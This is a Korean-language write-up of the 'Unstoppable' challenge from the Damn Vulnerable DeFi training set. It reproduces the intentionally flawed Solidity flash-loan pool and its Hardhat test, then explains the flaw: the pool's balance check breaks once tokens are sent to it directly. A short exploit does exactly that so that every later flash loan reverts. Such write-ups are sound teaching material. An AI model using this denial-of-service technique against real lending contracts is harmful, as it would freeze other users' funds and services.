https://teberr.notion.site/Damn-Vulnerable-Defi-Unstoppable-a743c4a589b040e585354fee91933c54

# 문제 소개

![문제소개.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/dc1308c6-35ae-49e1-a8d7-2dd071a91f47/%EB%AC%B8%EC%A0%9C%EC%86%8C%EA%B0%9C.png)

문제 #1 - Unstoppable

백만 DVT 토큰이 있는 대출 풀이 대출 서비스를 제공해주고 있다. 100 DVT를 가지고 이 대출 서비스를 공격하여 더이상 정상적으로 작동하지 않도록 해보자.

먼저 컨트랙트 코드부터 살펴보자.

# ReceiverUnstoppable.sol

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../unstoppable/UnstoppableLender.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ReceiverUnstoppable {

    UnstoppableLender private immutable pool; 
    address private immutable owner;

    constructor(address poolAddress) { 
        pool = UnstoppableLender(poolAddress);
        owner = msg.sender; 
    }

    function receiveTokens(address tokenAddress, uint256 amount) external {
        require(msg.sender == address(pool), "Sender must be pool");
        require(IERC20(tokenAddress).transfer(msg.sender, amount), "Transfer of tokens failed");
    } 

    function executeFlashLoan(uint256 amount) external {
        require(msg.sender == owner, "Only owner can execute flash loan");
        pool.flashLoan(amount);
    }
}
```

# UnstoppableLender.sol

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

interface IReceiver {
    function receiveTokens(address tokenAddress, uint256 amount) external;
}

contract UnstoppableLender is ReentrancyGuard {

    IERC20 public immutable damnValuableToken;
    uint256 public poolBalance;

    constructor(address tokenAddress) {
        require(tokenAddress != address(0), "Token address cannot be zero");
        damnValuableToken = IERC20(tokenAddress); 
    }

    function depositTokens(uint256 amount) external nonReentrant {
        require(amount > 0, "Must deposit at least one token"); 
        damnValuableToken.transferFrom(msg.sender, address(this), amount);
        poolBalance = poolBalance + amount; 
    }

    function flashLoan(uint256 borrowAmount) external nonReentrant {
        require(borrowAmount > 0, "Must borrow at least one token");
        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
        assert(poolBalance == balanceBefore);
        damnValuableToken.transfer(msg.sender, borrowAmount);
        IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);
        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }
}
```

이 코드를 보고 아래 Exploit에 값을 채워서 익스플로잇에 성공한다면 문제를 해결한 것이다.

```tsx
const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Unstoppable', function () {
    let deployer, attacker, someUser;

    // Pool has 1M * 10**18 tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
    const INITIAL_ATTACKER_TOKEN_BALANCE = ethers.utils.parseEther('100');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        [deployer, attacker, someUser] = await ethers.getSigners();

        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        const UnstoppableLenderFactory = await ethers.getContractFactory('UnstoppableLender', deployer);

        this.token = await DamnValuableTokenFactory.deploy();
        this.pool = await UnstoppableLenderFactory.deploy(this.token.address);

        await this.token.approve(this.pool.address, TOKENS_IN_POOL);
        await this.pool.depositTokens(TOKENS_IN_POOL);

        await this.token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(INITIAL_ATTACKER_TOKEN_BALANCE);

         // Show it's possible for someUser to take out a flash loan
         const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser);
         this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address);
         await this.receiverContract.executeFlashLoan(10);
    });

    it('Exploit', async function () {
				/** Exploit Code */
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // It is no longer possible to execute flash loans
        await expect(
            this.receiverContract.executeFlashLoan(10)
        ).to.be.reverted;
    });
});
```

# 코드 분석 및 공격 설계

1. ReceiverUnstoppable.sol
2. UnstoppableLender.sol

의 코드를 분석하자

## 1. ReceiverUnstoppable.sol

ReceiverUnstoppable.sol은  Unstoppable 대출 풀에서 대출을 받는 사용자로 다음과 같이 구성되어있다.

```solidity
contract ReceiverUnstoppable {

    UnstoppableLender private immutable pool; 
    address private immutable owner;

    constructor(address poolAddress) {
        pool = UnstoppableLender(poolAddress);
        owner = msg.sender; 
    }

    function receiveTokens(address tokenAddress, uint256 amount) external {
        require(msg.sender == address(pool), "Sender must be pool");
        require(IERC20(tokenAddress).transfer(msg.sender, amount), "Transfer of tokens failed");
    } 

    function executeFlashLoan(uint256 amount) external {
        require(msg.sender == owner, "Only owner can execute flash loan");
        pool.flashLoan(amount);
    }
}
```

### constructor (ReceiverUnstoppable)

```solidity
    constructor(address poolAddress) {
        pool = UnstoppableLender(poolAddress);
        owner = msg.sender; 
    }
```

대출 풀의 주소와 사용자의 주소를 컨트랙트에 저장한다.

### receiveTokens (ReceiverUnstoppable)

```solidity
   function receiveTokens(address tokenAddress, uint256 amount) external {
        require(msg.sender == address(pool), "Sender must be pool");
        require(IERC20(tokenAddress).transfer(msg.sender, amount), "Transfer of tokens failed");
    } 
```

대출 풀에서 호출하는 함수로 사용자가 대출 풀에게 amount만큼 토큰을 전송하게 된다.

### executeFlashLoan (ReceiverUnstoppable)

```solidity
    function executeFlashLoan(uint256 amount) external {
        require(msg.sender == owner, "Only owner can execute flash loan");
        pool.flashLoan(amount);
    }
```

실행한 주소가 사용자라면 amount 만큼 대출을 받는다.

## 2. UnstoppableLender.sol

UnstoppableLender.sol은 대출을 해주는 대출 풀이다.

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

interface IReceiver {
    function receiveTokens(address tokenAddress, uint256 amount) external;
}

contract UnstoppableLender is ReentrancyGuard {

    IERC20 public immutable damnValuableToken;
    uint256 public poolBalance;

    constructor(address tokenAddress) { 
        require(tokenAddress != address(0), "Token address cannot be zero");
        damnValuableToken = IERC20(tokenAddress); 
    }

    function depositTokens(uint256 amount) external nonReentrant {
        require(amount > 0, "Must deposit at least one token"); 
        damnValuableToken.transferFrom(msg.sender, address(this), amount);
        poolBalance = poolBalance + amount;
    }

    function flashLoan(uint256 borrowAmount) external nonReentrant {
        require(borrowAmount > 0, "Must borrow at least one token");
        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
        assert(poolBalance == balanceBefore);
        damnValuableToken.transfer(msg.sender, borrowAmount);
        IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);
        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }
}
```

이 또한 세 개의 함수로 구성되어 있다.

### constructor (UnstoppableLender)

```solidity
    constructor(address tokenAddress) { 
        require(tokenAddress != address(0), "Token address cannot be zero");
        damnValuableToken = IERC20(tokenAddress); 
    }
```

damnValuableToken 주소를 설정해준다. (단, 이 주소는 0이 아님) 

### depositToken (UnstoppableLender)

```solidity
    function depositTokens(uint256 amount) external nonReentrant {
        require(amount > 0, "Must deposit at least one token"); 
        damnValuableToken.transferFrom(msg.sender, address(this), amount);
        poolBalance = poolBalance + amount;
    }
```

입금되는 토큰의 양은 0보다 커야하며 이 함수를 호출한 msg.sender에게서 이 컨트랙트 주소로 amount 만큼 토큰을 이동시킨다. 

또한 poolBalance(대출풀의 잔고)는 기존의 poolBalance에서 새로 입금받은 양만큼 추가 된다.

### flashloan (UnstoppableLender)

```solidity
    function flashLoan(uint256 borrowAmount) external nonReentrant {
        require(borrowAmount > 0, "Must borrow at least one token");
        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
        assert(poolBalance == balanceBefore);
        damnValuableToken.transfer(msg.sender, borrowAmount);
        IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);
        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }
```

대출 풀의 핵심인 대출 서비스이다. 

사용자가 0보다 많은 토큰을 빌리고자 하고,이 컨트랙트에 있는 damnValuableToken의 잔고가 사용자가 대출하고자 하는 양보다 많아 대출하기에 충분하다면 poolBalance(풀에 deposit된 잔고)와 대출하기 전의 잔고가 같은지 체크한 후 사용자에게 대출을 해준다.

그리고 사용자로부터 빌려준 양만큼 다시 토큰을 받아오고 받아온 후의 이 컨트랙트에 있는 damnValuableToken 잔고(balanceAfter)가 대출해주기 전 damnValuableToken 잔고(balanceBefore)이상인지 검사한다. 

대출 서비스가 제대로 작동이 되지 않으려면 이 함수가 제대로 작동을 하지 않아야 하므로 조건을 충족시키지 못하게 revert가 나게 될 있는 요소가 있는지 확인해보자. 일반적으로 revert가 날 요소 중 하나는 오버플로우 및 언더플로우 인데 이 함수에서는 덧셈 및 뺄셈이 없어 이 경우는 제외한다.

```solidity
require(borrowAmount > 0, "Must borrow at least one token");
```

첫 번째 조건은 borrowAmount가 0보다 커야한다. 이 borrowAmount 값은 언제든지 바뀔수 있는 파라미터 값이므로 절대로 만족하지 못하는 값으로 고정 시킬 수는 없다.

```solidity
require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
```

두번째 조건은 대출해주기 이전의 컨트랙트 내에 있는 잔고인 balanceBefore가 빌려줄 토큰의 양보다 커야 한다는 조건이다. 이 또한 borrowAmount가 언제든지 바뀔수 있는 파라미터 값이므로 항상 만족하지 못하게 만들려면 balanceBefore를 조작해야 하는데 이는 우리가 빼낼 권한이 없다.

```solidity
assert(poolBalance == balanceBefore);
```

세번째 조건은 assert인데 poolBalance(depositTokens 함수를 이용해 입금된 토큰의 양)과 balanceBefore(컨트랙트에 존재하는 damnvaluableToken의 잔고)가 같은지 검사한다.

depositTokens 함수를 이용해서만 컨트랙트에 토큰을 전송할 수 있다면 이 조건이 만족하겠지만 컨트랙트 특성상 컨트랙트의 주소로 토큰을 전송할 수 있어 balanceBefore의 값이 조작이 가능하다. 이렇게 컨트랙트 주소로 직접 전송하게 되면 depositToken으로 입금한 것이 아니므로 poolBalance는 증가하지 않아 조건이 항상 만족하지 못하고 revert가 나게된다. 

따라서 우리는 컨트랙트의 주소로 토큰을 전송하여 poolBalance와 balanceBefore가 다르게 만들어 항상 flashLoan함수가 revert 되도록 공격하면 된다.

# 공격

Damn-Vulnerable-Defi에서의 공격은 test 폴더의 unstoppable.challenge.js 파일을 통해서 공격이 성공하는지 테스트 하는 방식으로 이루어진다. 

```solidity
const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Unstoppable', function () {
    let deployer, attacker, someUser;

    // Pool has 1M * 10**18 tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
    const INITIAL_ATTACKER_TOKEN_BALANCE = ethers.utils.parseEther('100');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        [deployer, attacker, someUser] = await ethers.getSigners();

        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        const UnstoppableLenderFactory = await ethers.getContractFactory('UnstoppableLender', deployer);

        this.token = await DamnValuableTokenFactory.deploy();
        this.pool = await UnstoppableLenderFactory.deploy(this.token.address);

        await this.token.approve(this.pool.address, TOKENS_IN_POOL);
        await this.pool.depositTokens(TOKENS_IN_POOL);

        await this.token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(INITIAL_ATTACKER_TOKEN_BALANCE);

         // Show it's possible for someUser to take out a flash loan
         const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser);
         this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address);
         await this.receiverContract.executeFlashLoan(10);
    });

    it('Exploit', async function () {
				/** Exploit Code */
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // It is no longer possible to execute flash loans
        await expect(
            this.receiverContract.executeFlashLoan(10)
        ).to.be.reverted;
    });
});
```

각 컨트랙트는 이미 deploy되어 있고 대출 풀에는 백만개의 토큰이 deposit으로 입금되어 있고 우리는 attacker로 토큰을 100개 갖고 있다.

```tsx
    it('Exploit', async function () {
				/** Exploit Code */
    });
```

이 부분에 우리가 공격 설계한대로 attacker가 대출 풀의 주소로 토큰을 0개보다 많이 보내는 코드를 작성하면 된다. 

```tsx
it('Exploit', async function () {
        const attackTokenContract = this.token.connect(attacker);
        await attackTokenContract.transfer(this.pool.address,1);
});
```

this.token.connect(attacker)를 통해서 공격자의 주소를 받은 후([https://docs.ethers.io/v5/single-page/#/v5/api/contract/contract/-%23-Contract-connect](https://docs.ethers.io/v5/single-page/#/v5/api/contract/contract/-%23-Contract-connect)) 이 주소에서 대출 풀의 주소로 토큰을 1개 보내는 코드이다.

![익스플로잇.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/778d3518-8a85-4815-8781-4a4e687aa295/%EC%9D%B5%EC%8A%A4%ED%94%8C%EB%A1%9C%EC%9E%87.png)

visual studio code에서 npm run unstoppable을 통해 테스트를 진행하면 Exploit에 체크표시가 되어있으면서 성공한 것을 확인할 수 있다.
